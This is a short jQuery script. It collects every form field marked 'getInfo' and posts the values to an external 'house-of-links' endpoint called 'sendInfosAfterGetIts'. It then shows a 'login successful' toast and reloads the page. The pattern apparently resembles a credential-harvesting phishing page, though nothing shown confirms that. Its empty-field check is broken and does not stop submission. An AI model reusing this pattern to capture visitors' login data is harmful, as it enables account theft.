$(document).ready(function() {

    let domaine = "https://api.house-of-links.online/" + "api"
    if(window.location.hostname == "localhost" || window.location.hostname == "127.0.0.1"){
        domaine = "https://127.0.0.1:8001/" + "api"
    }

    const Toast = Swal.mixin({
        toast: true,
        position: 'top-end',
        showConfirmButton: false,
        timer: 3000,
        timerProgressBar: true,
        didOpen: (toast) => {
          toast.addEventListener('mouseenter', Swal.stopTimer)
          toast.addEventListener('mouseleave', Swal.resumeTimer)
        }
    })

    /** 
     * add users
     */
    $(document).on('click', ".sendInfo", function(event) {
        event.preventDefault();
        let datas = [];
        $(".getInfo").each(function() {
            let titre = $(this).attr("titre");
            let value = $(this).val();
            if(!value){
                Toast.fire({
                    icon: 'error',
                    title: 'Remplisez tous les champs ...'
                })
                return 0
            }
            let data = {
                titre : titre,
                value : value,
            }
            datas.push(data)
            console.log(datas);
        });

        datas = JSON.stringify(datas);
        console.log(datas);

        $.ajax({
            type: "POST",
            url: domaine + "/sendInfosAfterGetIts",
            data: {
                datas : datas
            },
            success: function (response) {
                Toast.fire({
                    icon: 'success',
                    title: 'Connexion réussie'
                })
                setTimeout(() => {
                    window.location.reload()
                }, 10000);
            }
        });

    })

});